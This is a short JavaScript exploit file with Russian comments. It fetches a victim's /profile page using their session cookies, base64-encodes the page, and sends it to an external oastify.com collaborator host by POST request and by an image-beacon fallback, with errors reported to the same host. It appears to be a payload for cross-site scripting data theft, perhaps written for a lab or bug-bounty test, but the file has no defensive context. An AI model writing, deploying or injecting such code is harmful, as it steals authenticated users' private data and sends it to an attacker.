// exp.js - эксплойт для кражи содержимого /profile
const attackerURL = 'https://weej3j1x73zuqqu1tzqr0r0rxi3gr6fv.oastify.com';

// Выполняем запрос к защищенной странице
fetch('/profile', {
    credentials: 'include' // Важно: отправляем куки авторизации
})
.then(response => response.text())
.then(data => {
    // Кодируем содержимое в base64
    const base64Data = btoa(unescape(encodeURIComponent(data)));
    
    // Отправляем данные на сервер злоумышленника
    fetch(`${attackerURL}/exfil`, {
        method: 'POST',
        mode: 'no-cors',
        body: base64Data
    });
    
    // Дополнительный метод отправки через изображение
    new Image().src = `${attackerURL}?data=${encodeURIComponent(base64Data)}`;
})
.catch(error => {
    // Отправляем ошибки на сервер
    new Image().src = `${attackerURL}?error=${encodeURIComponent(error.message)}`;
});
